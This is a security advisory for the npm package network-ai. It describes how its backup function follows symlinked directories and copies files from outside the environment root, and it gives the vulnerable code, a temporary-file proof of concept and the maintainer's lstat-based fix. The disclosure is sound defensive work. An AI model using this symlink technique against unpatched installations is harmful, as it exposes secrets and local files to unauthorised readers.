# [M] Network-AI: EnvironmentManager.backup() follows symlinked directories and copies files outside the environment root into backups

## Summary
Severity: Medium
Advisory: GHSA-6x2m-p4xp-wg22
CWE: CWE-22, CWE-59
Ecosystem: npm
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-06-19
Source: https://github.com/advisories/GHSA-6x2m-p4xp-wg22
Type: github-advisory

## Affected
- npm: `network-ai` — affected >=0 <5.12.2

## Details
### Summary
`EnvironmentManager.backup()` recursively collects files using `_collectBackupFiles()`. `_collectBackupFiles()` uses `statSync(full)`, which follows symlinks. If `data/<env>` contains a symlink to a directory outside the environment root, backup recursion follows the symlink and copies external files into `data/<env>/.backups/<backupId>/`.

An attacker who can place a symlink under the environment data directory can cause backup operations to disclose files outside the environment root into backup artifacts. Confirmed in Network-AI 5.12.1.

### Details
`backup()` collects file paths and copies them into the backup directory:

```ts
const files = this._collectBackupFiles(envDir);
for (const rel of files) {
  const src = join(envDir, rel);
  const dst = join(backupPath, rel);
  mkdirSync(join(backupPath, rel.includes('/') ? rel.substring(0, rel.lastIndexOf('/')) : '.'), { recursive: true });
  try { copyFileSync(src, dst); } catch { /* skip unreadable */ }
}
```

`_collectBackupFiles()` follows symlinked directories because it calls `statSync()`, not `lstatSync()`:

```ts
const info = statSync(full);
if (info.isDirectory()) {
  walk(full, rel);
} else {
  results.push(rel);
}
```

Default CLI reachability exists through `network-ai env backup create --env <env>`. `backup()` also runs automatically before promotion and restore operations.

Affected source evidence:

- `lib/env-manager.ts:435-460` — backup copy logic.
- `lib/env-manager.ts:596-617` — symlink-following `_collectBackupFiles()`.
- `bin/cli.ts:413-420` — default CLI exposes backup creation.
- `lib/env-manager.ts:294-297` and `483-484` — backup also runs before promote/restore.

### PoC
This PoC uses only temporary files. It creates a symlink inside `data/dev` pointing to an external directory, then runs `backup('dev')` and observes that the external file is copied into the backup:

```bash
TMP=$(mktemp -d)
TMPBASE="$TMP" node -r ts-node/register/transpile-only - <<'TS'
const { EnvironmentManager } = require('./lib/env-manager');
const fs = require('fs');
const path = require('path');
const base = process.env.TMPBASE;
const data = path.join(base, 'data');
const outside = path.join(base, 'outside');

fs.mkdirSync(outside, { recursive: true });
fs.writeFileSync(path.join(outside, 'secret.txt'), 'secret-through-symlink');

const mgr = new EnvironmentManager(data, {
  chain: ['dev', 'st'],
  gates: { dev: 'auto', st: 'auto' },
});

mgr.init('dev');
fs.symlinkSync(outside, path.join(data, 'dev', 'linked-outside'), 'dir');

const result = mgr.backup('dev');
const copied = path.join(result.path, 'linked-outside', 'secret.txt');

console.log(JSON.stringify({
  copied: fs.existsSync(copied),
  content: fs.readFileSync(copied, 'utf8'),
}, null, 2));

fs.rmSync(base, { recursive: true, force: true });
TS
```

Observed result: `copied` is `true` and `content` is `secret-through-symlink`.

### Impact
An attacker who can place a symlink in `data/<env>` can cause backup creation to copy arbitrary readable files from outside the environment root into `data/<env>/.backups/<backupId>/`. This can disclose secrets or local files to any actor/process that can later read or export Network-AI backup artifacts. No RCE chain was confirmed.


---

### Resolution (maintainer)

**Fixed in [v5.12.2](https://github.com/Jovancoding/Network-AI/releases/tag/v5.12.2) (commit `a59c13a`).** Install: `npm install network-ai@5.12.2` — published to npm with provenance.

`_collectBackupFiles()` now uses `lstatSync` instead of `statSync` and skips any entry where `isSymbolicLink()` is true. Symlinks are never traversed, so `backup()` can no longer follow a link out of the environment root and copy external files into a backup artifact.

All 3,269 tests pass against the patched build. Thanks to @sondt99 for the responsible disclosure.

## References
- https://github.com/Jovancoding/Network-AI/security/advisories/GHSA-6x2m-p4xp-wg22
- https://github.com/Jovancoding/Network-AI/commit/a59c13a1f0ce0e8a0779a90343eef92fac5ab4c3
- https://github.com/Jovancoding/Network-AI
- https://github.com/Jovancoding/Network-AI/releases/tag/v5.12.2
